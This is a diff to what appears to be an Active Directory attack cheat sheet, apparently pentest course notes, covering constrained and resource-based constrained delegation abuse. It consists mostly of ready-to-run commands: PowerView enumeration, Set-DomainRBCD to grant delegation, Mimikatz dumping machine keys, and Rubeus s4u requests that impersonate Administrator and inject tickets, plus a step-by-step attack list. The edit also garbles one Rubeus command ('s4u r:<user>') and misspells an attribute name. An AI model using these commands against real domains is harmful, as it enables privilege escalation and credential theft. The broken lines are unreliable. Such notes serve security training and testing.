@@ -186,16 +186,19 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 ```
 ### Constrained Delegation
 With have GenericALL/GenericWrite privileges on a machine account object of a domain, it can be abused, and then impersonate ourselves as any user of the domain to the machine.
+- `msdn-allowedtodelegate`: services that can be abused for impersonation.
 ```powershell
 # Get users with Constraied delegation
 C:> . .\PowerView.ps1
 C:> Get-DomainUser -TrustedToAuth
 #    msds-allowedtodelegateto : {CIFS/host.domain.LOCAL, CIFS/host}    <-- Service to abuse
-#    useraccountcontrol       : TRUSTED_TO_AUTH_FOR_DELEGATION         <-- When user is trusted 
+#    useraccountcontrol       : TRUSTED_TO_AUTH_FOR_DELEGATION         <-- User is trusted 
 #    samaccountname            : websvc                                <-- user name
 
-# Request a TGS for user as Domain Administrator for CIFS on host
-C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator 
+# Request a TGS for user as Domain Administrator for CIFS on host. The user that has constrained
+# delegation can request the ticket to impersonate Admin user (f.ex.). We get a ticket in this example
+# to impersonate user Administrator on <host> for shared files (CIFS)
+C:> Rubeus.exe s4u r:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator 
                    /msdsspn:"CIFS/<host_fqdn>" /ptt
 ```
 ```powershell
@@ -210,24 +213,34 @@ C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuse
 #### Resource Based RBCD
 Required control over an object which has SPN configured, write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity required. 
 With required privileges on a computer object, it can be abused and impersonate ourselves as any user of the domain to it.
+1. Check if User has Write Permissions over a machine
+2. Check machines for RCBD enabled
+3. Check if user from step 1 has Write access to machine in 2
+4. Add our machine as delegated for machine 1
+5. Get hash of our machine
+6. Impersonate user using our machine hash 
 ```powershell
 # Use BloodHound to get Users permissions over hosts for clues
 
 # Then check potential users with following command
-C:> Find-InterestingDomainACL | ?{$_.identityreferencename | -match '<user>')
+C:> Find-InterestingDomainACL | ?{$_.identityreferencename -match '<user>'}
 #   ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
 #   ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
 #   SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1109
 #   IdentityReferenceName   : ciadmin
+# Also can check for everything to enumerate all and then check previous command
+C:>  Find-InterestingDomainAcl | select identityreferencename,identityreferenceclass,activedirectoryrights
 
-# Check for RCBD enabled machnes
+# Check for RCBD enabled machines
 C:> Get-DomainRBCD
 
-# Set RCBD on <host> for the "machines"
+# Set RCBD on <host> for the "machines". Interesting to make our machine a delegatefrom
 C:> Set-DomainRBCD -Identity <host> -DelegateFrom 'machine1$|machine2$|machine3$' -Verbose
+# Listing again the RBCD machines will show outs in the DelegatedName
 
 # Get Keys for machine1, our own machine, as rcbd was configured before
 C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys" "exit"'
+# Check the SID: S-1-5-18 to know which has to pick
 
 # Abuse RBCD to access <host> as domain admin
 C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> /impersonateuser:administrator /ptt
